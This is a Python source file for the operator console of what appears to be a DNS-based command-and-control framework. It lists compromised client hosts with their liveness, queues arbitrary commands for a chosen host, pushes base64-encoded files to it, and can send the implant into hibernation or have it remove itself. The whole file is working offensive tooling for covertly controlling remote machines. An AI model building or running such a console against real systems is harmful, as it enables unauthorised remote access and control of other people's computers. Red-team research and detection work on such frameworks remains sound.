# console.py
import json
import time
import base64
from os import path

import settings

# Base function for command line interface
def newConsole():
    consoleGetID()

    print("Type help or ? for command options: ")
    while True:

        with open('./manage.json') as f:
            manage = json.load(f) 
        consoleInput = input(str(manage["currID"]) + " > ")

        options = {
            "?": consoleHelp,
            "help": consoleHelp,
            "set": consoleSetID,
            "get": consoleGetID,
            "send": consoleSend,
            "dissolve": consoleDissolve,
            "hibernate": consoleHibernate,
            "file": consoleFile
        }

        
        if consoleInput == '':
            continue
        if consoleInput not in options:
            print("Not an Option. Try again")
        else:
            options[consoleInput]()

# Print info on commands
def consoleHelp():
    print("\nHelp Menu\n_________\n"
            "? or help\t\tdisplay help\n"
            "set\t\t\tset the ID to interact with\n"
            "get\t\t\tget a list of stored clientss\n"
            "send\t\t\tsend a command to the active id\n"
            "dissolve\t\tremove client on a host\n"
            "hibernate\t\tsend the client into hibernation (stop sending dns requests)\n"
            "file\t\t\ttransfer a file to the client\n")

# Set the id to interact with
def consoleSetID():
    newID = input("Which ID?: ")

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)      
        
        if newID in manage["clients"]:
            manage["currID"] = newID
        else:
            print("not a valid ID")
            
        with open('./manage.json', 'w') as f:
            json.dump(manage, f)

# Print the current client connections stored
def consoleGetID():
    with open('./manage.json') as f:
        manage = json.load(f) 
        
    print("\nID\t\tHostname\t\tState")
    print("____\t\t________________\t_____")
    for x in manage["clients"]:
        if (time.time() - manage["clients"][x]["lastactive"]) < settings.ttl:
            state = "alive"
        else:
            state = "dead"
        print(x + "\t\t" + manage["clients"][x]["hostname"] + "\t\t" + state)
    print('')

# Get a command from user and set to next command for client
def consoleSend():
    command = input("Ready for command: ")

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)
        
        if manage["currID"] in manage["clients"]:
            manage["clients"][manage["currID"]]["command"] = command
            
            with open('./manage.json', 'w') as f:
                json.dump(manage, f)
        else:
            print("Need to set a valid ID first")

# Tell client agent to stop running
def consoleDissolve():
    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        if manage["currID"] in manage["clients"]:
            
            manage["clients"][manage["currID"]]["command"] = "dissolve"

            with open('./manage.json', 'w') as f:
                json.dump(manage, f)
        else:
            print("Need to set a valid ID first")

# Tell client to sleep for a set amount of time (stop sending DNS requests)
def consoleHibernate():
    hibLength = input("For how long in seconds (Cannot exceed 2147483): ")

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        if manage["currID"] in manage["clients"]:

            manage["clients"][manage["currID"]]["args"] = []
            
            manage["clients"][manage["currID"]]["command"] = "hibernate"
            manage["clients"][manage["currID"]]["args"].append(str(hibLength))
            
            with open('./manage.json', 'w') as f:
                json.dump(manage, f)
        else:
            print("Need to set a valid ID first")

# Send file for client to store on file system
def consoleFile():

    filename = input("What is the filename: ")
    
    if not path.exists(filename):
        print("File does not exist")
        return

    with open(filename, 'rb') as f:
        data = f.read()

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)
        
        if manage["currID"] not in manage["clients"]:
            print("Need to set a valid ID first")
            return
        
        manage["clients"][manage["currID"]]["args"] = []

        manage["clients"][manage["currID"]]["command"] = "file"
        manage["clients"][manage["currID"]]["args"].append(filename)
        manage["clients"][manage["currID"]]["args"].append(base64.b64encode(data).decode())

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)